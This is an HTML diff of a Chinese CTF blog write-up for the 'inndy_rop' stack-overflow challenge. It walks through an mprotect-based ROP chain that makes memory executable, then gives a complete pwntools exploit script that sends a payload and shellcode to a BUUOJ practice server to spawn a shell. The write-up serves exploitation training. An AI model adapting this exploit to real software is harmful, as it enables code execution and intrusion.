@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="inndy_rop(栈溢出)  我们先checksec一下：  没有开启canary保护，所以八成是栈溢出的题目，拖入IDA中，下面是主函数：  这里好像是没有办法反编译的，我的IDA不行，这里看到了nop指令，nop指令就是啥都不干的意思，可以直接跳过，我们看到了call overflow 这条指令，我们去这个函数里面去看看：  没问题了，是栈溢出，这是一个静态编译的文件，我们可以利用mprot">
+<meta property="og:type" content="article">
+<meta property="og:title" content="inndy_rop(栈溢出)">
+<meta property="og:url" content="http://example.com/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/index.html">
+<meta property="og:site_name" content="WangYiHao">
+<meta property="og:description" content="inndy_rop(栈溢出)  我们先checksec一下：  没有开启canary保护，所以八成是栈溢出的题目，拖入IDA中，下面是主函数：  这里好像是没有办法反编译的，我的IDA不行，这里看到了nop指令，nop指令就是啥都不干的意思，可以直接跳过，我们看到了call overflow 这条指令，我们去这个函数里面去看看：  没问题了，是栈溢出，这是一个静态编译的文件，我们可以利用mprot">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/1.png">
+<meta property="og:image" content="http://example.com/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/2.png">
+<meta property="og:image" content="http://example.com/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/3.png">
+<meta property="og:image" content="http://example.com/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/4.png">
+<meta property="og:image" content="http://example.com/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/6.png">
+<meta property="article:published_time" content="2024-05-28T07:11:06.000Z">
+<meta property="article:modified_time" content="2024-05-28T08:20:51.175Z">
+<meta property="article:author" content="SunRT">
+<meta property="article:tag" content="栈溢出">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>inndy_rop(栈溢出)</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2024/05/28/picoctf-2018-buffer-overflow-1/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2024/05/27/jarvisoj-level4/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/&text=inndy_rop(栈溢出)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/&title=inndy_rop(栈溢出)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/&is_video=false&description=inndy_rop(栈溢出)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=inndy_rop(栈溢出)&body=Check out this article: http://example.com/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/&title=inndy_rop(栈溢出)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/&title=inndy_rop(栈溢出)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/&title=inndy_rop(栈溢出)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/&title=inndy_rop(栈溢出)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/&name=inndy_rop(栈溢出)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/&t=inndy_rop(栈溢出)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">inndy_rop(栈溢出)</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        inndy_rop(栈溢出)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">SunRT</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-05-28T07:11:06.000Z" itemprop="datePublished">2024-05-28</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag">栈溢出</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 align="center">inndy_rop(栈溢出)</h1>
+
+<p>我们先checksec一下：</p>
+<p><img src="/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/1.png" alt="1"></p>
+<p>没有开启canary保护，所以八成是栈溢出的题目，拖入IDA中，下面是主函数：</p>
+<p><img src="/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/2.png" alt="2"></p>
+<p>这里好像是没有办法反编译的，我的IDA不行，这里看到了nop指令，nop指令就是啥都不干的意思，可以直接跳过，我们看到了call</p>
+<p>overflow 这条指令，我们去这个函数里面去看看：</p>
+<p><img src="/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/3.png" alt="3"></p>
+<p>没问题了，是栈溢出，这是一个静态编译的文件，我们可以利用mprotect()函数(静态编译一定存在)对某个地址的权限进行修改，将其修改为可读可写可执行，下面我们看看mprotect()函数的用法：</p>
+<p><img src="/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/4.png" alt="4"></p>
+<p>需要注意的是，参数addr必须是4kb的整数倍,也就是0x1000(4096&#x3D;0x1000)字节的整数倍,size的大小也得是0x1000的整数倍，想要可读可写可执行，prot传入7就可以了，接下来我们可以找找要更改的地址：</p>
+<p><img src="/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/6.png" alt="6"></p>
+<p>我们选择0x80e9000这个地址，刚好是0x1000的整数倍，第二个参数我们设置成0x2000，把这个段写满：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mprotect_address = <span class="number">0x806DDA0</span></span><br><span class="line">gai_address = <span class="number">0x80e9000</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*(<span class="number">0xc</span>+<span class="number">0x4</span>) + p32(mprotect_address) + p32(main_address) + p32(gai_address) + p32(<span class="number">0x2000</span>) + p32(<span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+<p>这样的话，这个段就具有可读，可写，可执行的权限了并且返回到了main函数，接下来我们利用read函数，向0x806DDA0+0x1000地址写入shellcode，然后跳转到0x806DDA0+0x1000地址，最后脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26356</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&#x27;./rop&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./rop&quot;</span>)</span><br><span class="line">main_address = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">read_address = <span class="number">0x806d290</span></span><br><span class="line"></span><br><span class="line">mprotect_address = <span class="number">0x806DDA0</span></span><br><span class="line">gai_address = <span class="number">0x80e9000</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*(<span class="number">0xc</span>+<span class="number">0x4</span>) + p32(mprotect_address) + p32(main_address) + p32(gai_address) + p32(<span class="number">0x2000</span>) + p32(<span class="number">0x7</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh(),arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*(<span class="number">0xc</span>+<span class="number">0x4</span>) + p32(read_address) + p32(gai_address+<span class="number">0x1000</span>) + p32(<span class="number">0</span>) + p32(gai_address+<span class="number">0x1000</span>) + p32(<span class="built_in">len</span>(shellcode))</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">inndy_rop(栈溢出)</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/&text=inndy_rop(栈溢出)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/&title=inndy_rop(栈溢出)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/&is_video=false&description=inndy_rop(栈溢出)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=inndy_rop(栈溢出)&body=Check out this article: http://example.com/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/&title=inndy_rop(栈溢出)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/&title=inndy_rop(栈溢出)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/&title=inndy_rop(栈溢出)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/&title=inndy_rop(栈溢出)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/&name=inndy_rop(栈溢出)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/05/28/inndy-rop-%E6%A0%88%E6%BA%A2%E5%87%BA/&t=inndy_rop(栈溢出)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    SunRT
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"In die Zwischenablage kopiert!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Kopiert!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
